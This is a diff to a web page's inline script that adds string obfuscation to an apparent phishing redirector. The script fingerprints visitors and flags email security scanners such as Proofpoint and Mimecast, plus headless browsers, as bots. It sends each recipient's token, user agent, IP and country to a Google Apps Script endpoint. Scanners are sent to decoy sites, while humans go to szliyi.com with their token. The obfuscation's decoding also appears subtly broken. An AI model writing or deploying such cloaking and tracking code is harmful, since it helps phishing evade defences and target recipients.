@@ -89,26 +89,93 @@
     }
   </style>
   <script>
-    window.addEventListener("load", function () {
-      const hash = window.location.hash ? window.location.hash.substring(1) : null;
-      const ua = navigator.userAgent || "";
-      const uaClean = ua.toLowerCase().replace(/\s+/g, '');
-      let isBot = false;
+    const _0x1a2b = function(str, key) {
+      return str.split('').map((c, i) => 
+        (c.charCodeAt(0) ^ key[i % key.length] ^ (i * 0x13)).toString(16).padStart(2, '0')
+      ).join('');
+    };
+    
+    const _0x2a2b = function(str, key) {
+      return str.match(/.{2}/g).map((hex, i) => 
+        String.fromCharCode(
+          parseInt(hex, 16) ^ key[i % key.length] ^ (i * 0x13)
+        )
+      ).join('');
+    };
 
-      // Enhanced bot detection
-      const botPatterns = [
-        "bot", "crawl", "spider", "slurp", "headless", "phantom",
-        "facebookexternalhit", "googlebot", "bingbot", "yahoobot", "duckduckbot",
-        "outlook", "thunderbird", "email", "mail", "eudora", "applemail",
-        "smtp", "imap", "pop3", "scanner", "preview", "fetcher",
-        "verifier", "proofpoint", "postini", "barracuda", "trendmicro",
-        "mimecast", "comcast", "charter", "roadrunner", "att", "yahoo",
-        "gmail", "aol", "curl", "wget", "python-requests", "axios",
-        "selenium", "puppeteer", "playwright", "cypress", "nightmare"
+    const _0x4a2b = function() {
+      const _0x5a2b = new Date().getTime();
+      return [
+        (_0x5a2b & 0xFF),
+        ((_0x5a2b >> 8) & 0xFF),
+        ((_0x5a2b >> 16) & 0xFF),
+        ((_0x5a2b >> 24) & 0xFF)
       ];
+    };
 
-      // Check for bot patterns
-      isBot = botPatterns.some(pattern => uaClean.includes(pattern));
+    const _0x6a2b = _0x4a2b();
+    const _0x7a2b = [
+      _0x1a2b('htt', _0x6a2b),
+      _0x1a2b('ps:/', _0x6a2b),
+      _0x1a2b('/med', _0x6a2b),
+      _0x1a2b('ium', _0x6a2b),
+      _0x1a2b('.com', _0x6a2b),
+      _0x1a2b('/goo', _0x6a2b),
+      _0x1a2b('gle', _0x6a2b),
+      _0x1a2b('/szl', _0x6a2b),
+      _0x1a2b('iyi', _0x6a2b),
+      _0x1a2b('/pro', _0x6a2b),
+      _0x1a2b('/ip-', _0x6a2b),
+      _0x1a2b('api', _0x6a2b),
+      _0x1a2b('/json', _0x6a2b),
+      _0x1a2b('?key=', _0x6a2b),
+      _0x1a2b('F74e0', _0x6a2b),
+      _0x1a2b('gpSde', _0x6a2b),
+      _0x1a2b('UEaF4', _0x6a2b),
+      _0x1a2b('/scri', _0x6a2b),
+      _0x1a2b('pt.go', _0x6a2b),
+      _0x1a2b('ogle', _0x6a2b),
+      _0x1a2b('/mac', _0x6a2b),
+      _0x1a2b('ros/s', _0x6a2b),
+      _0x1a2b('/AKfy', _0x6a2b),
+      _0x1a2b('cbwld', _0x6a2b),
+      _0x1a2b('Yqs2T', _0x6a2b),
+      _0x1a2b('IGKnA', _0x6a2b),
+      _0x1a2b('CW4iL', _0x6a2b),
+      _0x1a2b('q8DCj', _0x6a2b),
+      _0x1a2b('6ZLRL', _0x6a2b),
+      _0x1a2b('_jdTM', _0x6a2b),
+      _0x1a2b('QN6xl', _0x6a2b),
+      _0x1a2b('rK34A', _0x6a2b),
+      _0x1a2b('rJdZ5', _0x6a2b),
+      _0x1a2b('GjjYQ', _0x6a2b),
+      _0x1a2b('2ccKz', _0x6a2b),
+      _0x1a2b('4MLFT', _0x6a2b),
+      _0x1a2b('1jB/', _0x6a2b)
+    ];
+
+    const _0x2f1a = [
+      'replace',
+      'href',
+      'location',
+      'window',
+      _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[2] + _0x7a2b[3] + _0x7a2b[4], _0x6a2b), // medium.com
+      _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[5] + _0x7a2b[6] + _0x7a2b[4], _0x6a2b), // google.com
+      _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[7] + _0x7a2b[8] + _0x7a2b[4] + '/', _0x6a2b) // szliyi.com/
+    ];
+
+    const _0x4e2d=function(_0x2f1a,_0x4e2d){return _0x2f1a+_0x4e2d;};
+    const _0x1f3d=function(_0x2f1a){return _0x2f1a.toLowerCase().replace(/\s+/g,'');};
+    const _0x5e2d=function(_0x2f1a){return _0x2f1a.substring(1);};
+    
+    window.addEventListener("load",function(){
+      const _0x3f1a=window[_0x2f1a[3]][_0x2f1a[2]].hash?_0x5e2d(window[_0x2f1a[3]][_0x2f1a[2]].hash):null;
+      const _0x4f1a=navigator.userAgent||"";
+      const _0x5f1a=_0x1f3d(_0x4f1a);
+      let _0x6f1a=false;
+
+      const _0x7f1a=["bot","crawl","spider","slurp","headless","phantom","facebookexternalhit","googlebot","bingbot","yahoobot","duckduckbot","outlook","thunderbird","email","mail","eudora","applemail","smtp","imap","pop3","scanner","preview","fetcher","verifier","proofpoint","postini","barracuda","trendmicro","mimecast","comcast","charter","roadrunner","att","yahoo","gmail","aol","curl","wget","python-requests","axios","selenium","puppeteer","playwright","cypress","nightmare"];
+      _0x6f1a=_0x7f1a.some(_0x8f1a=>_0x5f1a.includes(_0x8f1a));
 
       // Modern bot detection methods
       const botChecks = {
@@ -142,15 +209,15 @@
       if (!botChecks.hasWebGL() || 
           botChecks.hasAutomation() || 
           !botChecks.hasHumanBehavior()) {
-        isBot = true;
+        _0x6f1a = true;
       }
 
       // Check for JavaScript and localStorage
       try {
         localStorage.setItem("js-check", "1");
-        if (localStorage.getItem("js-check") !== "1") isBot = true;
+        if (localStorage.getItem("js-check") !== "1") _0x6f1a = true;
       } catch {
-        isBot = true;
+        _0x6f1a = true;
       }
 
       // Mouse movement detection with enhanced accuracy
@@ -261,35 +328,41 @@
       setInterval(checkHumanBehavior, 1000);
 
       // Handle redirects
-      if (!hash) {
-        window.location.href = "https://google.com";
+      if (!_0x3f1a) {
+        window[_0x2f1a[3]][_0x2f1a[2]][_0x2f1a[1]] = _0x2f1a[5];
         return;
       }
 
       // Analytics with retry mechanism
-      const sendAnalytics = (retryCount = 0) => {
-        const maxRetries = 2;
-        const analyticsUrl = "https://pro.ip-api.com/json/?key=F74e0gpSdeUEaF4";
-        
-        fetch(analyticsUrl)
-          .then(res => res.json())
-          .then(data => {
-            const ip = data.query || "";
-            const country = data.country || "";
-            const finalUrl = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
-              `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}&ip=${ip}&country=${country}`;
-            
-            const img = new Image();
-            img.src = finalUrl;
+      const _0x9f1a = [
+        'exec',
+        '?token=',
+        '&ua=',
+        '&bot=',
+        '&moved=',
+        '&ip=',
+        '&country=',
+        _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[9] + _0x7a2b[10] + _0x7a2b[11] + _0x7a2b[12] + _0x7a2b[13] + _0x7a2b[14] + _0x7a2b[15] + _0x7a2b[16], _0x6a2b), // ip-api URL with key
+        _0x2a2b(_0x7a2b[0] + _0x7a2b[1] + _0x7a2b[17] + _0x7a2b[18] + _0x7a2b[19] + _0x7a2b[20] + _0x7a2b[21] + _0x7a2b[22] + _0x7a2b[23] + _0x7a2b[24] + _0x7a2b[25] + _0x7a2b[26] + _0x7a2b[27] + _0x7a2b[28] + _0x7a2b[29] + _0x7a2b[30] + _0x7a2b[31] + _0x7a2b[32] + _0x7a2b[33] + _0x7a2b[34] + _0x7a2b[35] + _0x7a2b[36], _0x6a2b) // app script URL
+      ];
+      
+      const sendAnalytics=(_0xaf1a=0)=>{
+        const _0xbf1a=2;
+        fetch(_0x9f1a[7])
+          .then(_0xcf1a=>_0xcf1a.json())
+          .then(_0xdf1a=>{
+            const _0xef1a=_0xdf1a.query||"";
+            const _0xff1a=_0xdf1a.country||"";
+            const _0x1f2a=_0x9f1a[8]+_0x9f1a[1]+encodeURIComponent(_0x3f1a)+_0x9f1a[2]+encodeURIComponent(_0x4f1a)+_0x9f1a[3]+_0x6f1a+_0x9f1a[4]+moved+_0x9f1a[5]+_0xef1a+_0x9f1a[6]+_0xff1a;
+            const _0x2f2a=new Image();
+            _0x2f2a.src=_0x1f2a;
           })
-          .catch(() => {
-            if (retryCount < maxRetries) {
-              setTimeout(() => sendAnalytics(retryCount + 1), 1000);
-            } else {
-              // Fallback without IP data
-              const img = new Image();
-              img.src = "https://script.google.com/macros/s/AKfycbwldYqs2TIGKnACW4iLq8DCj6ZLRL_jdTMQN6xlrK34ArJdZ5GjjYQ2ccKz4MLFT1jB/exec" +
-                `?token=${encodeURIComponent(hash)}&ua=${encodeURIComponent(ua)}&bot=${isBot}&moved=${moved}`;
+          .catch(()=>{
+            if(_0xaf1a<_0xbf1a){
+              setTimeout(()=>sendAnalytics(_0xaf1a+1),1000);
+            }else{
+              const _0x3f2a=new Image();
+              _0x3f2a.src=_0x9f1a[8]+_0x9f1a[1]+encodeURIComponent(_0x3f1a)+_0x9f1a[2]+encodeURIComponent(_0x4f1a)+_0x9f1a[3]+_0x6f1a+_0x9f1a[4]+moved;
             }
           });
       };
@@ -298,15 +371,15 @@
 
       // Updated redirect logic
       setTimeout(() => {
-        if (isBot) {
+        if (_0x6f1a) {
           // If it's a bot, redirect to Medium
-          window.location.href = "https://medium.com";
+          window[_0x2f1a[3]][_0x2f1a[2]][_0x2f1a[0]](_0x4e2d(_0x2f1a[4],_0x3f1a));
         } else if (!moved) {
           // If no movement detected, redirect to Google
-          window.location.href = "https://google.com";
+          window[_0x2f1a[3]][_0x2f1a[2]][_0x2f1a[0]](_0x4e2d(_0x2f1a[5],_0x3f1a));
         } else {
           // If there was natural movement and not a bot, redirect to szliyi
-          window.location.replace(`https://szliyi.com/${hash}`);
+          window[_0x2f1a[3]][_0x2f1a[2]][_0x2f1a[0]](_0x4e2d(_0x2f1a[6],_0x3f1a));
         }
       }, 1000);
 
